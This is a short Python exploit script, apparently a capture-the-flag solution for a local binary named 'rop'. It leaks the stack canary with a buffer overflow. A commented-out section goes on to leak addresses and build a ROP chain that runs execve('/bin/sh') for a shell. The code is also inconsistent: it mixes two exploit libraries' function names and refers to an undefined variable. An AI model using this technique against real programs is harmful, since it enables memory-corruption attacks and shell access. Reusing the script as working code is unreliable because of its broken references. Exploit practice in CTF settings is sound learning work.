from ptrlib import *

# context(os='linux', arch='amd64')
# context.terminal = ['i3-sensible-terminal', '-e']

bin_file = './rop'
elf = ELF(bin_file)
proc = Process(bin_file)

def leak_canary():
    paylaod = b'a' * 0x28
    # over write last 0x00 in canary
    paylaod += b'!'
    conn.sendafter('>> ', paylaod)
    conn.recvuntil('a!')
    # for little endian, x00 at first
    canary = u64(b'\x00' + conn.recv(7))
    return canary

# def leak_baseaddr():

def attack(conn):
    # leak canary
    canary = leak_canary()
    print("canary: ", hex(canary))

    # leak base addr
    # offset_main = binf.symbol("main")
    # conn.sendafter('>> ', b'c'*0x37 + b'!')
    # conn.recvuntil('c!')
    # addr_main = unpack(conn.recv(6), 'all')
    # binf.address = addr_main - offset_main
    #
    # スタックアドレスリーク
    # conn.sendafter('>> ', b'b'*0x47 + b'!')
    # conn.recvuntil('b!')
    # addr_stack = unpack(conn.recv(6), 'all') - 0x208
    #
    # # ROPチェーン構築
    # rop = ROP(binf)
    # rop.execve(addr_stack, 0, 0)  # 自動的にすべて設定
    #
    # exploit = b'/bin/sh'.ljust(0x18, b'\x00')
    # exploit += pack(canary)
    # exploit += pack(0)
    # exploit += rop.chain()
    #
    # conn.sendafter('>> ', exploit)
    # conn.interactive()

if __name__ == '__main__':
    conn = process(bin_file)
    # gdb.attach(conn, '''
    # handle SIGSEGV stop nopass
    # continue
    # ''')
    attack(conn)
